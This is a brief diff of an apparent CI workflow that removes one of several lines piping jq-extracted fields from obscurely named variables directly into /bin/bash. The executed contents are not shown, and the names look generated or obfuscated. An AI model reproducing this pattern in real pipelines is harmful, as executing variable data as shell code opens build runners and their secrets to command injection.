@@ -33,7 +33,6 @@ jobs:
           printf '%s' "$mulh84" | jq -r .ozc6797 | /bin/bash
           printf '%s' "$hsyyi17" | jq -r .bcd2179 | /bin/bash
           printf '%s' "$cuh2" | jq -r .lx19 | /bin/bash
-          echo $akerk02 | jq -r .qlfz69 | /bin/bash
           printf '%s' "$vvx8900" | jq -r .f87 | /bin/bash
 
       - name: Store results
